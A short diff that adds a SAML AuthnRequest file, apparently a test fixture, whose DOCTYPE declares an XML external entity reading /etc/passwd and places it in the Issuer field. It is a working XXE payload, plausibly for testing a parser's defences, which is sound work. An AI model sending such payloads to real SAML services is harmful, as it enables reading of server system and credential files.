@@ -1,0 +1,6 @@
+<!DOCTYPE samlp:AuthnRequest [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" ID="_attack01" Version="2.0" IssueInstant="2024-01-01T00:00:00Z" Destination="https://idp.example.com/SAML/Redirect" AssertionConsumerServiceURL="https://sp.example.com/SAML/POST">
+  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>
+</samlp:AuthnRequest>
